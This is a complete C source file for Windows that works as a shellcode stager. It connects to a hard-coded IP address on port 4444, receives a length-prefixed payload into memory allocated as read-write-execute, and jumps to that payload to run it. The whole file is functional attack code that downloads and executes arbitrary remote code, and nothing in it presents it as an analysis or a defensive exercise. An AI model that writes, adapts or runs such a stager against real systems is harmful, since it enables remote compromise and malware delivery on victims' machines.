#include <windows.h>
#include <winsock2.h>
#include <stdio.h>

#define IP_ADDRESS "10.230.229.13"
#define PORT 4444
#define BUF_LEN 1024
#define PAYLOAD_SZ 819200

int main() {
  // Initialize Winsock and use version 2.2
  WSADATA wsaData;
  int wResult;
  WSAStartup(MAKEWORD(2,2), &wsaData);
  // if (wResult != 0) {
  //    return 1;
  //};

  // Create a socket to connect to an IP and port
  // printf("Creating socket...\n");
  SOCKET ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

  // Define socket type, AF_INET (IPv4), IP address, and port.
  struct sockaddr_in saServer;
  saServer.sin_family = AF_INET;
  saServer.sin_addr.s_addr = inet_addr(IP_ADDRESS);
  saServer.sin_port = htons(PORT);

  // Set Receive timeout on the socket
  // struct timeval tv;
  // tv.tv_sec = 1;
  // setsockopt(ConnectSocket, SOL_SOCKET, SO_RCVTIMEO, (char *)&tv, sizeof(tv));

  // Connect to socket
  printf("Connecting to %s on port %d.\n", IP_ADDRESS, PORT);
  connect( ConnectSocket, (SOCKADDR*) &saServer, sizeof(saServer) );

  // Receive data from port;
  char buf[BUF_LEN] = "";
  char *rwx = (char *)VirtualAlloc(NULL, PAYLOAD_SZ, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  char *index = rwx;    // Pointer to track position in the payload buffer.
  int res = 0;          // Hold return value of recv().
  u_long size = 0;      // Holds the size of the payload.
  int rcvd = 0;         // Track how many bytes we have received. Should match size when done.

  printf("Receiving\n");
  do {
    res = recv( ConnectSocket, index, BUF_LEN, 0 );
    if (rcvd == 0) { size = *(u_long*)rwx; }
    index += res;
    rcvd += res;
  } while (size > rcvd);

  // printf("Executing payload.\n");
  // Execute the received payload. Skip the first four bytes, which holds the size of the payload.
  ((void(*)()) (rwx + 4))();
}

